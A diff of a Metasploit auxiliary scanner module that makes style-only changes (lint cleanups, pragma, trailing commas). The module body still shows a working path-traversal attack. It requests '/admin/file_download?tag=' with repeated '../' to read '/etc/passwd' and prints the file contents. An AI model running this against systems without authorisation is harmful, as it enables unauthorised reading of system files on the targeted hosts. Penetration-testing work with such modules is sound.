@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
@@ -34,14 +34,14 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),
-        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
-      ], self.class)
+        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7])
+      ], self.class
+    )
   end
 
-  def run_host(ip)
-
+  def run_host(_ip)
     traversal = '../../'
-    part1= '/admin/file_download?tag='
+    part1 = '/admin/file_download?tag='
     part2 = '&fileType=snapshot'
 
     begin
@@ -49,22 +49,24 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw(
         {
           'method'  => 'GET',
-          'uri'     => '/admin',
-        }, 25)
+          'uri'     => '/admin'
+        }, 25
+      )
 
-      if (res)
+      if res
         1.upto(datastore['MAXDIRS']) do |level|
           try = traversal * level
           traversalstring = part1 + try + datastore['FILE'] + part2
           res = send_request_raw(
             {
               'method'  => 'GET',
-              'uri'     => traversalstring,
-            }, 25)
-          if (res and res.code == 200)
+              'uri'     => traversalstring
+            }, 25
+          )
+          if res && (res.code == 200)
             print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}!\r\n Response: \r\n#{res.body}")
             break
-          elsif (res and res.code)
+          elsif res && res.code
             print_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}\r\n")
           end
         end
